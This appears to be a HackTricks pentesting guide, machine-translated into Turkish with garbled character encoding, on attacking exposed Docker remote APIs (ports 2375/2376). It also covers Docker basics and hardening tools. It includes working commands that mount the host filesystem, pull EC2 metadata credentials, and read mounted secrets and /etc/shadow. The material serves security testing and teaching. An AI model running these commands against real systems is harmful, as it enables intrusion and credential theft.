# 2375, 2376 Pentesting Docker

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


### Docker Temelleri

#### Nedir

Docker, **konteynerleÅŸtirme endÃ¼strisinde** **Ã¶ncÃ¼ platform** olup, **sÃ¼rekli yenilik** konusunda Ã¶ncÃ¼lÃ¼k etmektedir. UygulamalarÄ±n **gelenekselden geleceÄŸe** kadar kolayca oluÅŸturulmasÄ±nÄ± ve daÄŸÄ±tÄ±lmasÄ±nÄ± saÄŸlar ve bunlarÄ±n Ã§eÅŸitli ortamlarda **gÃ¼venli daÄŸÄ±tÄ±mÄ±nÄ±** garanti eder.

#### Temel docker mimarisi

* [**containerd**](http://containerd.io): Bu, konteynerlerin **yaÅŸam dÃ¶ngÃ¼sÃ¼nÃ¼n kapsamlÄ± yÃ¶netimi** ile gÃ¶revli bir **temel Ã§alÄ±ÅŸma zamanÄ±**dÄ±r. Bu, **gÃ¶rÃ¼ntÃ¼ transferi ve depolamasÄ±** ile birlikte konteynerlerin **Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±, izlenmesi ve aÄŸ baÄŸlantÄ±sÄ±nÄ±n** denetimini iÃ§erir. **Containerd hakkÄ±nda daha ayrÄ±ntÄ±lÄ± bilgiler** **daha fazla incelenmiÅŸtir**.
* **container-shim**, **baÅŸsÄ±z konteynerlerin** yÃ¶netiminde bir **aracÄ±** olarak kritik bir rol oynar ve konteynerler baÅŸlatÄ±ldÄ±ktan sonra **runc**'dan sorumluluÄŸu devralÄ±r.
* [**runc**](http://runc.io): **Hafif ve evrensel konteyner Ã§alÄ±ÅŸma zamanÄ±** yetenekleri ile tanÄ±nan runc, **OCI standardÄ±** ile uyumludur. Containerd tarafÄ±ndan **konteynerleri baÅŸlatmak ve yÃ¶netmek** iÃ§in **OCI yÃ¶nergelerine** gÃ¶re kullanÄ±lÄ±r ve orijinal **libcontainer**'dan evrim geÃ§irmiÅŸtir.
* [**grpc**](http://www.grpc.io), containerd ile **docker-engine** arasÄ±nda **ileÅŸimi kolaylaÅŸtÄ±rmak** iÃ§in gereklidir ve **verimli etkileÅŸim** saÄŸlar.
* [**OCI**](https://www.opencontainers.org), Ã§alÄ±ÅŸma zamanÄ± ve gÃ¶rÃ¼ntÃ¼ler iÃ§in **OCI spesifikasyonlarÄ±nÄ±** korumada kritik bir rol oynar ve en son Docker sÃ¼rÃ¼mleri **hem OCI gÃ¶rÃ¼ntÃ¼ hem de Ã§alÄ±ÅŸma zamanÄ±** standartlarÄ±na uygundur.

#### Temel komutlar
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd**, **Docker ve Kubernetes** gibi konteyner platformlarÄ±nÄ±n ihtiyaÃ§larÄ±nÄ± karÅŸÄ±lamak iÃ§in Ã¶zel olarak geliÅŸtirilmiÅŸtir. AmacÄ±, iÅŸletim sistemi Ã¶zel iÅŸlevselliÄŸini ve sistem Ã§aÄŸrÄ±larÄ±nÄ± soyutlayarak, Linux, Windows, Solaris ve daha fazlasÄ± dahil olmak Ã¼zere Ã§eÅŸitli iÅŸletim sistemleri arasÄ±nda **konteynerlerin Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± basitleÅŸtirmektir**. Containerd'nin hedefi, kullanÄ±cÄ±larÄ± tarafÄ±ndan gerekli olan yalnÄ±zca temel Ã¶zellikleri iÃ§ermek ve gereksiz bileÅŸenleri hariÃ§ tutmaya Ã§alÄ±ÅŸmaktÄ±r. Ancak, bu hedefe tamamen ulaÅŸmanÄ±n zorluÄŸu kabul edilmektedir.

Ana tasarÄ±m kararÄ±, **Containerd'nin aÄŸ yÃ¶netimini Ã¼stlenmemesidir**. AÄŸ, daÄŸÄ±tÄ±k sistemlerde kritik bir unsur olarak kabul edilir ve YazÄ±lÄ±m TanÄ±mlÄ± AÄŸ (SDN) ve hizmet keÅŸfi gibi karmaÅŸÄ±klÄ±klar, bir platformdan diÄŸerine Ã¶nemli Ã¶lÃ§Ã¼de deÄŸiÅŸir. Bu nedenle, Containerd, desteklediÄŸi platformlarÄ±n yÃ¶netmesine bÄ±rakÄ±r.

**Docker, konteynerleri Ã§alÄ±ÅŸtÄ±rmak iÃ§in Containerd'yi kullanÄ±rken**, Containerd'nin yalnÄ±zca Docker'Ä±n iÅŸlevselliklerinin bir alt kÃ¼mesini desteklediÄŸini belirtmek Ã¶nemlidir. Ã–zellikle, Containerd, Docker'da bulunan aÄŸ yÃ¶netim yeteneklerinden yoksundur ve doÄŸrudan Docker sÃ¼rÃ¼mleri oluÅŸturmayÄ± desteklemez. Bu ayrÄ±m, Containerd'nin bir konteyner Ã§alÄ±ÅŸma zamanÄ± ortamÄ± olarak odaklanmÄ±ÅŸ rolÃ¼nÃ¼ vurgulamakta ve daha Ã¶zel iÅŸlevsellikleri entegre olduÄŸu platformlara devretmektedir.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman**, Red Hat tarafÄ±ndan geliÅŸtirilen ve sÃ¼rdÃ¼rÃ¼len, [Open Container Initiative (OCI) standartlarÄ±na](https://github.com/opencontainers) uyan aÃ§Ä±k kaynaklÄ± bir konteyner motorudur. **Daemonless mimarisi** ve **rootless konteynerler** desteÄŸi gibi birkaÃ§ belirgin Ã¶zellik ile Docker'dan ayrÄ±lÄ±r; bu, kullanÄ±cÄ±larÄ±n konteynerleri root ayrÄ±calÄ±klarÄ± olmadan Ã§alÄ±ÅŸtÄ±rmalarÄ±nÄ± saÄŸlar.

Podman, Docker'Ä±n API'si ile uyumlu olacak ÅŸekilde tasarlanmÄ±ÅŸtÄ±r ve Docker CLI komutlarÄ±nÄ±n kullanÄ±lmasÄ±na olanak tanÄ±r. Bu uyumluluk, konteyner gÃ¶rÃ¼ntÃ¼leri oluÅŸturmak iÃ§in **Buildah** ve push, pull ve inspect gibi gÃ¶rÃ¼ntÃ¼ iÅŸlemleri iÃ§in **Skopeo** gibi araÃ§larÄ± iÃ§eren ekosistemine de uzanÄ±r. Bu araÃ§lar hakkÄ±nda daha fazla ayrÄ±ntÄ± [GitHub sayfalarÄ±nda](https://github.com/containers/buildah/tree/master/docs/containertools) bulunabilir.

**Ana FarklÄ±lÄ±klar**

* **Mimari**: Dockerâ€™Ä±n arka planda bir daemon ile Ã§alÄ±ÅŸan istemci-sunucu modelinin aksine, Podman bir daemon olmadan Ã§alÄ±ÅŸÄ±r. Bu tasarÄ±m, konteynerlerin baÅŸlatan kullanÄ±cÄ±nÄ±n ayrÄ±calÄ±klarÄ±yla Ã§alÄ±ÅŸmasÄ±nÄ± saÄŸlar ve root eriÅŸimine ihtiyaÃ§ duymayarak gÃ¼venliÄŸi artÄ±rÄ±r.
* **Systemd Entegrasyonu**: Podman, konteynerleri yÃ¶netmek iÃ§in **systemd** ile entegre olur ve systemd birimleri aracÄ±lÄ±ÄŸÄ±yla konteyner yÃ¶netimine olanak tanÄ±r. Bu, Docker'Ä±n esas olarak Docker daemon sÃ¼recini yÃ¶netmek iÃ§in systemd kullanmasÄ±yla zÄ±tlÄ±k gÃ¶sterir.
* **Rootless KapsayÄ±cÄ±lar**: Podman'Ä±n Ã¶nemli bir Ã¶zelliÄŸi, konteynerleri baÅŸlatan kullanÄ±cÄ±nÄ±n ayrÄ±calÄ±klarÄ± altÄ±nda Ã§alÄ±ÅŸtÄ±rabilmesidir. Bu yaklaÅŸÄ±m, saldÄ±rganlarÄ±n yalnÄ±zca tehlikeye atÄ±lan kullanÄ±cÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ± elde etmesini saÄŸlayarak konteyner ihlalleriyle iliÅŸkili riskleri en aza indirir, root eriÅŸimi saÄŸlamaz.

Podman'Ä±n yaklaÅŸÄ±mÄ±, kullanÄ±cÄ± ayrÄ±calÄ±k yÃ¶netimi ve mevcut Docker iÅŸ akÄ±ÅŸlarÄ±yla uyumluluÄŸu vurgulayarak Docker'a gÃ¼venli ve esnek bir alternatif sunar.

{% hint style="info" %}
Podman, Docker ile aynÄ± API'yi desteklemeyi amaÃ§ladÄ±ÄŸÄ± iÃ§in, podman ile docker ile aynÄ± komutlarÄ± kullanabilirsiniz, Ã¶rneÄŸin:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

### Temel Bilgiler

Uzaktan API, etkinleÅŸtirildiÄŸinde varsayÄ±lan olarak 2375 portunda Ã§alÄ±ÅŸÄ±r. Hizmet varsayÄ±lan olarak kimlik doÄŸrulama gerektirmeyecek ÅŸekilde ayarlanmÄ±ÅŸtÄ±r, bu da bir saldÄ±rganÄ±n ayrÄ±calÄ±klÄ± bir docker konteyneri baÅŸlatmasÄ±na olanak tanÄ±r. Uzaktan API kullanÄ±larak, ana makineyi / (kÃ¶k dizin) konteynere eklemek ve ana makinenin ortamÄ±ndaki dosyalarÄ± okumak/yazmak mÃ¼mkÃ¼ndÃ¼r.

**VarsayÄ±lan port:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### Enumeration

#### Manual

Docker API'sini listelemek iÃ§in `docker` komutunu veya aÅŸaÄŸÄ±daki Ã¶rnekteki gibi `curl` kullanabileceÄŸinizi unutmayÄ±n:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
EÄŸer **uzaktaki docker API'si ile `docker` komutunu** **iletiÅŸim kurabiliyorsanÄ±z**, hizmetle etkileÅŸimde bulunmak iÃ§in **daha Ã¶nce** bahsedilen **docker** [**komutlarÄ±nÄ±**](2375-pentesting-docker.md#basic-commands) **Ã§alÄ±ÅŸtÄ±rabilirsiniz**.

{% hint style="info" %}
`export DOCKER_HOST="tcp://localhost:2375"` yapabilir ve docker komutuyla `-H` parametresini **kullanmayÄ±** **kaÃ§Ä±nabilirsiniz**
{% endhint %}

**HÄ±zlÄ± ayrÄ±calÄ±k yÃ¼kseltme**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

Bazen **TLS** uÃ§ noktasÄ± iÃ§in **2376** numarasÄ±nÄ± gÃ¶rebilirsiniz. Docker istemcisi ile buna baÄŸlanmayÄ± baÅŸaramadÄ±m ama curl ile bunu yapmak mÃ¼mkÃ¼n.
```bash
#List containers
curl â€“insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl â€“insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s â€“insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, itâ€™s also worth checking out services in case they are adding secrets via environment variables)
curl -s â€“insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
EÄŸer bunun hakkÄ±nda daha fazla bilgi istiyorsanÄ±z, komutlarÄ± kopyaladÄ±ÄŸÄ±m yerde daha fazla bilgi mevcuttur: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### Otomatik
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Compromising

AÅŸaÄŸÄ±daki sayfada **docker konteynerinden kaÃ§ma** yollarÄ±nÄ± bulabilirsiniz:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

Bunu kÃ¶tÃ¼ye kullanarak bir konteynerden kaÃ§mak mÃ¼mkÃ¼ndÃ¼r, uzaktaki makinede zayÄ±f bir konteyner Ã§alÄ±ÅŸtÄ±rabilir, ondan kaÃ§abilir ve makineyi tehlikeye atabilirsiniz:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### Yetki YÃ¼kseltme

EÄŸer docker kullanan bir hostun iÃ§indeyseniz, [**yetkileri yÃ¼kseltmeye Ã§alÄ±ÅŸmak iÃ§in bu bilgiyi okuyabilirsiniz**](../linux-hardening/privilege-escalation/#writable-docker-socket).

### Ã‡alÄ±ÅŸan Docker konteynerlerinde gizli bilgileri keÅŸfetme
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
Kontrol et **env** (Ã§evresel deÄŸiÅŸken bÃ¶lÃ¼mÃ¼) gizli bilgiler iÃ§in ve ÅŸunlarÄ± bulabilirsin:

* Parolalar.
* IPâ€™ler.
* Portlar.
* Yollar.
* DiÄŸerleriâ€¦ .

Bir dosyayÄ± Ã§Ä±karmak istiyorsan:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### Docker'Ä±nÄ±zÄ± GÃ¼venli Hale Getirme

#### Docker Kurulumu ve KullanÄ±mÄ±nÄ± GÃ¼venli Hale Getirme

* Mevcut docker kurulumunuzu incelemek iÃ§in [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) aracÄ±nÄ± kullanabilirsiniz.
* `./docker-bench-security.sh`
* Mevcut docker kurulumunuzu incelemek iÃ§in [https://github.com/kost/dockscan](https://github.com/kost/dockscan) aracÄ±nÄ± kullanabilirsiniz.
* `dockscan -v unix:///var/run/docker.sock`
* FarklÄ± gÃ¼venlik seÃ§enekleriyle Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda bir konteynerin sahip olacaÄŸÄ± ayrÄ±calÄ±klarÄ± incelemek iÃ§in [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) aracÄ±nÄ± kullanabilirsiniz. Bu, bir konteyneri Ã§alÄ±ÅŸtÄ±rmak iÃ§in bazÄ± gÃ¼venlik seÃ§eneklerini kullanmanÄ±n sonuÃ§larÄ±nÄ± bilmek iÃ§in faydalÄ±dÄ±r:
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### Docker GÃ¶rsellerini GÃ¼venli Hale Getirme

* DiÄŸer docker gÃ¶rsellerinizi taramak ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± bulmak iÃ§in [https://github.com/quay/clair](https://github.com/quay/clair) docker gÃ¶rselini kullanabilirsiniz.
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### Dockerfile'larÄ± GÃ¼venli Hale Getirme

* Dockerfile'Ä±nÄ±zÄ± **incelemek** ve her tÃ¼rlÃ¼ yanlÄ±ÅŸ yapÄ±landÄ±rmayÄ± bulmak iÃ§in [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) aracÄ±nÄ± kullanabilirsiniz. Her yanlÄ±ÅŸ yapÄ±landÄ±rmaya bir ID verilecektir, bunlarÄ± dÃ¼zeltmek iÃ§in [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) adresinden nasÄ±l dÃ¼zeltileceÄŸini bulabilirsiniz.
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (176).png>)

* Dockerfile'Ä±nÄ±zÄ± **incelemek** ve her tÃ¼rlÃ¼ yanlÄ±ÅŸ yapÄ±landÄ±rmayÄ± bulmak iÃ§in [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) aracÄ±nÄ± kullanabilirsiniz.
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (212).png>)

* Dockerfile'Ä±nÄ±zÄ± **incelemek** ve her tÃ¼rlÃ¼ yanlÄ±ÅŸ yapÄ±landÄ±rmayÄ± bulmak iÃ§in [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) aracÄ±nÄ± kullanabilirsiniz.
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (71).png>)

* Dockerfile'Ä±nÄ±zÄ± **incelemek** ve her tÃ¼rlÃ¼ yanlÄ±ÅŸ yapÄ±landÄ±rmayÄ± bulmak iÃ§in [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) aracÄ±nÄ± kullanabilirsiniz.
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (501).png>)

#### ÅÃ¼pheli Faaliyetleri Kaydetme

* Ã‡alÄ±ÅŸan konteynerlerde **ÅŸÃ¼pheli davranÄ±ÅŸlarÄ±** tespit etmek iÃ§in [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) aracÄ±nÄ± kullanabilirsiniz.
* AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde **Falco'nun bir Ã§ekirdek modÃ¼lÃ¼ derleyip eklediÄŸini** not edin. Daha sonra, kurallarÄ± yÃ¼kler ve **ÅŸÃ¼pheli faaliyetleri kaydetmeye baÅŸlar**. Bu durumda, 1'i hassas bir montaj ile birlikte 2 ayrÄ±calÄ±klÄ± konteynerin baÅŸlatÄ±ldÄ±ÄŸÄ±nÄ± tespit etmiÅŸtir ve birkaÃ§ saniye sonra bir kabuÄŸun konteynerlerden birinin iÃ§inde aÃ§Ä±ldÄ±ÄŸÄ±nÄ± tespit etmiÅŸtir.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### Docker'Ä± Ä°zleme

Docker'Ä± izlemek iÃ§in auditd kullanabilirsiniz.

### Referanslar

* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
* [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)


{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.**

</details>
{% endhint %}
